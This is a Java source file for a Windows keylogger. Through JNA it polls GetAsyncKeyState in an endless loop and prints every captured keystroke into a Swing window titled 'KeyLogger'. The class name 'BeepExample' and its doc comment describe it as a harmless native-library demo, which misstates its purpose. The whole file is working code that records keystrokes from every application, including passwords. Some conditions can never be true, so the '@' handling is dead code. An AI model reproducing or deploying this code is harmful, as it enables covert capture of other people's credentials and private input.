import com.sun.jna.Library;
import com.sun.jna.Native;
import javax.swing.*;

/** Simple example of Windows native library declaration and usage. */
public class BeepExample extends Thread{
  	JFrame frame = new JFrame("KeyLogger");
  	JTextArea area = new JTextArea();
  	JScrollPane pane = new JScrollPane(area);
   
   public interface user32 extends Library {
       public short GetKeyState(int key);
		public int GetAsyncKeyState(int key);
   }
 
  public BeepExample(){
 	area.setEditable(false);
  	frame.add(pane);
  	frame.setVisible(true);
  	frame.setSize(500,500);
  	frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
  	new KeyDetect().start();
  	}
 
   public static void main(String[] args) {
   	new BeepExample();
	
	}
	
	public void  Backspace(){
		String text = area.getText();
		
		area.setText("");
		for(int i=0;i<text.length()-1;i++){
		area.append(text.charAt(i)+"");
			}
		
		}

   class KeyDetect extends Thread {
  	public void run(){
  		
  		user32 lib = (user32) Native.loadLibrary("user32.dll", user32.class);
		System.out.println(lib.hashCode());
		int result;
		int r;
		int type;
		
	while(true){						
					for(int i=0;i<=200;i++){
						result = lib.GetAsyncKeyState(i);
						type = lib.GetKeyState(0x14);
						short t = lib.GetKeyState(0xA0);
						//System.out.println(""+t+ ": "+type);
							if(result ==-32767 && type==1 ){
								if(i!=8 && i!=16 && i!=160 && i!=161 && i<96 && i!=13){
									area.append((char)i+"");
									}
								else if(i==160 && i==16 && i==50){
										area.append("@");
										}
									else if(i==13){
										area.append("\n");
										}
									else if(i==96){
										area.append("0");
										}
									else if(i==97){
										area.append("1");
										}
										else if(i==98){
										area.append("2");
										}
										else if(i==99){
										area.append("3");
										}
										else if(i==100){
										area.append("4");
										}
										else if(i==101){
										area.append("5");
										}
										else if(i==102){
										area.append("6");
										}
										else if(i==103){
										area.append("7");
										}
										else if(i==104){
										area.append("8");
										}
										else if(i==105){
										area.append("9");
										}
									else if(i==8){
										Backspace();
										}
								
								}
								else if(result==-32767 && type==0){
										if(i!=8 && i!=16 && i!=160 && i!=161 && i<96 && i!=13 ){
									area.append(Character.toString((char)i).toLowerCase());
																
									}
									else if(i==160 && i==16 && i==161 && i==50){
										area.append("@");
										}
									else if(i==13){
										area.append("\n");
										}
									else if(i==96){
										area.append("0");
										}
									else if(i==97){
										area.append("1");
										}
										else if(i==98){
										area.append("2");
										}
										else if(i==99){
										area.append("3");
										}
										else if(i==100){
										area.append("4");
										}
										else if(i==101){
										area.append("5");
										}
										else if(i==102){
										area.append("6");
										}
										else if(i==103){
										area.append("7");
										}
										else if(i==104){
										area.append("8");
										}
										else if(i==105){
										area.append("9");
										}
									else if(i==8){
										Backspace();
										}
									
									}
						}
					
				}
  		
  		
  		}
  	
  	}
}